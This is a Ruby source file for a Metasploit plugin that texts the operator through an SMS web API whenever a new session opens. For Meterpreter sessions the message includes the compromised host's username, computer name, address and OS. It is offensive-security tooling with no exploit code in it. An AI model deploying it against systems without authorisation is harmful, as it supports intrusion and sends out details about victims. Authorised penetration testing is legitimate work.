require 'open-uri'
require 'time'

module Msf

###
#
# This class hooks all session creation events and sends an SMS when
# a new session is initiated.
#
# Ben Campbell <eat_meatballs[at]hotmail.co.uk>
#
# Configure an sms.yml in .msf4/ with the HTTP GET API request
# where the MSFCONTENT will be replaced by the message
# e.g.
#
# url: https://api.clockworksms.com/http/send.aspx?key=KEY&to=44123456789&content=MSFCONTENT
#
###

class Plugin::SessionSMS < Msf::Plugin


  def initialize(framework, opts)
    super
    @inst = add_console_dispatcher(SMSCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('SMS')
    self.framework.events.remove_session_subscriber(@inst)
  end

  def desc
    "Automatically sends SMS on new session"
  end

  def name
    "sms"
  end

  class SMSCommandDispatcher

    include Msf::SessionEvent
    include Msf::Ui::Console::CommandDispatcher

    def initialize(console_driver)
      super
      @verbose = false

      config_path = ::File.join(Msf::Config.get_config_root, "sms.yml")
      sms_config = YAML.load_file(config_path)
      @url = sms_config['url']
      uri = URI.parse(@url)

      if @url.empty?
        print_error("Unable to read config file #{config_path}")
      else
        print_status("Using SMS API: #{uri.host}")
        print_status("Start SMS Messaging with sms_start")
      end

      if uri.scheme == 'http'
        print_warning("#{uri.host} API is running over HTTP")
      end
    end

    def on_session_open(session)

      meterpreter = session.type == 'meterpreter'
      if meterpreter
        session.core.use('stdapi')
        sysinfo = session.sys.config.sysinfo
        computer = sysinfo['Computer']
        os = sysinfo['OS']

        # Strip domain if local user
        user = session.sys.config.getuid.gsub("#{computer}\\",'')
      end

      time = Time.now.strftime("%Y-%m-%d %H:%M")

      print_line("Sending SMS... Response: ") if @verbose

      message = "#{time}\nSession #{session.sid} from #{session.exploit.name}\n"
      message << "#{user}\n" if meterpreter
      message << "#{computer}\n" if meterpreter
      message << "#{session.session_host}\n"
      message << "#{os}" if meterpreter

      request_url = @url.gsub('MSFCONTENT', URI.escape(message))
      uri = URI.parse(request_url)
      result = uri.read
      print_line(result) if @verbose
    end

    def name
      "SMS"
    end

    def commands
      {
          'sms_start'   => "Start SMS",
          'sms_stop'    => "Stop SMS",
          'sms_verbose' => "Toggle Verbosity"
      }
    end

    def cmd_sms_start
      print_status "Starting SMS Messages"
      self.framework.events.add_session_subscriber(self)
    end

    def cmd_sms_stop
      print_status("Stopping SMS Messages")
      self.framework.events.remove_session_subscriber(self)
    end

    def cmd_sms_verbose
      @verbose = !@verbose
      print_status("SMS Verbose: #{@verbose}. Please stop and restart messaging")
    end
  end

end
end

